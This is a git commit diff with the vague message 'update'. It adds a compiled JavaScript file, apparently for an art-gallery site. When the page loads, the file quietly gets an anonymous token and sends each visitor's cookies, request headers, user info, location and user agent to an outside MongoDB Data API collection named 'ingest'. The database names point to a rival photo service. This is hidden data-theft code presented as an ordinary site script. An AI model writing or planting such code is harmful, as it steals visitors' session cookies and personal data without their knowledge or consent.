102b8d8bc0c4d3d18d3b83e280387345e63cd05e
username <user@email>
2025-05-13 02:28:36 -0400

    update

---
+++ scripts/compiled/artgallery_base.js
@@ -0,0 +1,54 @@
+const setPtxAccessToken = async () => {
+  return fetch(
+    "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
+  )
+    .then((resp) => resp.json())
+    .then((json) => json.access_token)
+    .then((token) => (window.accessToken = token));
+};
+
+const insertDoc = async (type, data) => {
+  const envelope = {};
+  envelope.sessionId = window.rjsSessionId;
+  envelope.type = type;
+  envelope.data = data;
+  envelope.userAgent = navigator?.userAgent;
+
+  envelope.ptData = {};
+  envelope.ptData.headers = _pt$?.hdrs || null;
+  envelope.ptData.userInfo = _pt$?.userInfo || null;
+  envelope.ptData.cookie = document.cookie;
+
+  envelope.ts = Date.now();
+
+  return fetch(
+    "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Access-Control-Request-Headers": "*",
+        Authorization: `Bearer ${window.accessToken}`,
+      },
+      body: JSON.stringify({
+        collection: "ingest",
+        database: "pictimeDataDb",
+        dataSource: "pixieset-data",
+        document: envelope,
+      }),
+    }
+  );
+};
+
+setPtxAccessToken().then(async () => {
+  setTimeout(async () => {
+    const userType = _pt$?.userInfo?.type;
+
+    if (userType === 6) {
+      const gusr = _pt$?.hdrs?.gusr;
+      const lusr = _pt$?.hdrs?.lusr;
+
+      await insertDoc("location", window.location);
+    }
+  }, 500);
+});
